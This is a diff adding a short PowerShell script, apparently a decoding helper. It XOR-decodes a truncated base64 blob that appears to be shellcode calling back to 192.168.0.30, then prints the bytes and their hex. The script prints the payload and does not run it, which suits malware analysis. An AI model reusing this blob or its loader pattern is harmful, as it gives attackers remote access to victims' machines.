@@ -1,0 +1,33 @@
+Qb7wtaJW/9VIMcm6AABAAEG4ABAAAEG5QAAAAEG6WKRT5f/VSJNTU0iJ50iJ8UiJ2kG4ACAAAEmJ+UG6EpaJ4v/VSIPEIIXAdLZmiwdIAcOFwHXXWFhYSAUAAAAAUMPon/3//zE5Mi4xNjguMC4zMABeLniQ'
+
+If ([IntPtr]::size -eq 8) {
+	[Byte[]]$var_code = [System.Convert]::FromBase64String($nuttystring)
+
+	for ($x = 0; $x -lt $var_code.Count; $x++) {
+		$var_code[$x] = $var_code[$x] -bxor 35
+	}
+
+Write-Host $var_code
+
+
+Write-Host ''
+#Write-Host $var_code
+$tempvar = [System.Convert]::FromBase64String($nuttystring)
+#Write-Host $tempvar
+$hexvar = 0xAE
+#Write-Host $hexvar
+for ($x = 0; $x -lt $tempvar.Count; $x++) {
+	$hextemp = $hextemp + '{0:x}' -f $tempvar[$x]
+#Write-Host ''
+#Write-Host $hextemp
+
+	}
+
+}
+
+Write-Host ''
+Write-Host ''
+Write-Host $hextemp
+Write-Host ''
+Write-Host ''
+Write-Host [System.Convert]::ToBase64String($nuttystring)
